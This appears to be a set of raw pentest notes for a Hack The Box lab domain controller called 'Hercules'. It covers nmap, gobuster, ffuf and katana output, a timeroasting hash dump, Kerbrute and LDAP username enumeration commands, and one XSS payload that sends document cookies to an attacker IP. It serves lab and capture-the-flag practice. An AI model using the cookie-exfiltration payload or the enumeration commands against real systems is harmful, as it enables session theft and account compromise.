# Enum 
nmap scan 
```
# Nmap 7.95 scan initiated Sat Oct 18 20:38:46 2025 as: /usr/lib/nmap/nmap --privileged -sV -sC -oN nmap.txt -p- --min-rate=5000 10.10.11.91
Nmap scan report for hercules.htb (10.10.11.91)
Host is up (1.9s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://hercules.htb/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-18 19:39:48Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=hercules.htb
| Subject Alternative Name: DNS:hercules.htb
| Not valid before: 2024-12-04T01:34:56
|_Not valid after:  2034-12-04T01:44:56
| http-methods:
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| tls-alpn:
|_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
54627/tcp open  msrpc         Microsoft Windows RPC
54633/tcp open  msrpc         Microsoft Windows RPC
54663/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-10-18T19:40:53
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 18 20:41:47 2025 -- 1 IP address (1 host up) scanned in 180.64 seconds
```

## subdomain 
```
gobuster vhost -u hercules.htb -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 64 --append-domain -xs 301

===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://hercules.htb
[+] Method:                    GET
[+] Threads:                   64
[+] Wordlist:                  /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:                gobuster/3.8
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
*.hercules.htb Status: 400 [Size: 334]
Progress: 100000 / 100000 (100.00%)
===============================================================
Finished
===============================================================
```

## dir fuzzing 

```
ffuf -u http://hercules.htb/FUZZ -w /usr/share/SecLists/Discovery/Web-Content/big.txt -c -ic -t 64 -fc 301

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hercules.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 64
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

:: Progress: [20478/20478] :: Job [1/1] :: 675 req/sec :: Duration: [0:00:34] :: Errors: 0 ::
```

## Timeroasting 

```
python3 timeroast.py dc01.hercules.htb
1000:$sntp-ms$8bf0390ae089ec5e916b2a025e2cbc9b$1c0111e900000000000af1114c4f434cec9e835dfe88a987e1b8428bffbfcd0aec9fc12e3e8864bdec9fc12e3e88c7ba

```

Its an admin NTP hash so mostly uncrackable . 

## Katana 

```
katana -u https://hercules.htb/

   __        __
  / /_____ _/ /____ ____  ___ _
 /  '_/ _  / __/ _  / _ \/ _  /
/_/\_\\_,_/\__/\_,_/_//_/\_,_/

                projectdiscovery.io

[INF] Current katana version v1.2.2 (latest)
[INF] Started standard crawling for => https://hercules.htb/
https://hercules.htb/
https://hercules.htb/
https://hercules.htb/Content/Assets/dev-at-office.jpg%20
https://hercules.htb/Content/js/leadmark.js
https://hercules.htb/Content/vendors/bootstrap/bootstrap.affix.js
https://hercules.htb/Content/vendors/themify-icons/css/themify-icons.css
https://hercules.htb/Content/vendors/isotope/isotope.pkgd.js
https://hercules.htb/
https://hercules.htb/Content/vendors/jquery/jquery-3.4.1.js
https://hercules.htb/Content/vendors/bootstrap/bootstrap.bundle.js
https://hercules.htb/Content/css/leadmark.css
https://hercules.htb/
```

`"><img src=x onerror=fetch('http://10.10.15.53'+btoa(document.cookie))>`

## Kerb users

```
kerbrute userenum --dc 10.10.11.91 -d hercules.htb /usr/share/SecLists/Usernames/xato-net-10-million-usernames-dup.txt
```

## LDAP 

```
nxc ldap hercules.htb -u /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt -p '' -k
```